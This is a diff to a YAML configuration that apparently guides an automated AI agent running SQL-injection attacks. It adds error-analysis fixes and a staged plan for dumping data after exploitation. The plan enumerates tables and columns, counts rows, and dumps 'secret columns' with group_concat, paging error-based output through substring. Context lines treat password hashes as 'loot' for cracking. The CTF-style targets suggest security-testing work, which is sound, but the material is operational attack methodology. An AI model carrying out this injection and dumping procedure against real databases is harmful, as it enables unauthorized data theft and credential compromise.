@@ -131,6 +131,8 @@ error_analysis:
       fix: "Error-based works: extract ONE value per request (updatexml/extractvalue truncate ~32 chars — use substring(...,1,32), substring(...,33,32) to page longer values)."
     - match: "you have an error in your sql syntax|unterminated|unclosed quotation|quoted string not properly"
       fix: "Syntax broke: fix the quote/comment terminator (-- - vs #), or switch technique (union -> error-based -> boolean -> time). If the error echoes a stray quote at your marker, the param is numeric — drop the quote entirely."
+    - match: "you have an error in your sql syntax.*near [\"'`]?(user|order|group|table|column|key|desc|asc|primary|index|values|references|check|default|constraint)[\"'`]?( |$)"
+      fix: "The table/column name is a SQL RESERVED WORD (e.g. user, order, group, key) — BACKTICK-quote it in MySQL/MariaDB: FROM `user`, SELECT `key`, `order`. (Postgres/SQLite use double-quotes: FROM \"user\".) Re-issue the same query with the identifier quoted."
     - match: "unknown column|no such column|invalid column name"
       fix: "Wrong column name: enumerate columns from information_schema.columns WHERE table_name='<t>' (MySQL/PG) or PRAGMA table_info (SQLite)."
     - match: "table.*(doesn'?t exist|not found)|no such table|invalid object name"
@@ -148,3 +150,31 @@ error_analysis:
       tweak: "Output looks HEX / a hash — unhex() it, or if it's a password hash that IS the loot (hand it to cracking)."
     - match: "limit|only .* row|1 row in set|single row"
       tweak: "Only one row came back — use group_concat()/string_agg() (or LIMIT/OFFSET paging) to get all rows at once."
+
+# ── Data-COLLECTION methodology (Phase 2 agent), as DATA ──────────────────────────
+# Collect in STAGES — never jump straight to data. The collect agent walks this plan
+# (common/vuln_skills.postex_collection); each stage's result feeds the next. Embedded
+# into RAG so the planner can recall the order too.
+collection:
+  methodology: >-
+    Collect systematically, in order, reusing the CORRECTED working payload and changing
+    ONLY the subquery: (1) enumerate TABLES, (2) enumerate COLUMNS of the table that matches
+    the objective (users/secret/flag/config/admin), (3) get the ROW COUNT to size it and
+    confirm read access, (4) DUMP the rows (group_concat, page long values). Do not skip a
+    stage; pick the table/columns whose names match the objective.
+  plan:
+    - stage: tables
+      goal: "list all table names in the current database"
+      subquery: "SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()"
+      sqlite: "SELECT group_concat(name) FROM sqlite_master WHERE type='table'"
+    - stage: columns
+      goal: "list the columns of the target table (the one that matches the objective)"
+      subquery: "SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='<TABLE>'"
+      sqlite: "SELECT group_concat(name) FROM pragma_table_info('<TABLE>')"
+    - stage: row_counts
+      goal: "count rows in the target table to size it and confirm read access"
+      subquery: "SELECT COUNT(*) FROM <TABLE>"
+    - stage: data
+      goal: "dump the objective rows (identifier + secret columns)"
+      subquery: "SELECT group_concat(<COLS> SEPARATOR 0x0a) FROM <TABLE>"
+      note: "error-based caps ~32 chars — page with substring(...,N,32) if the concat is long"
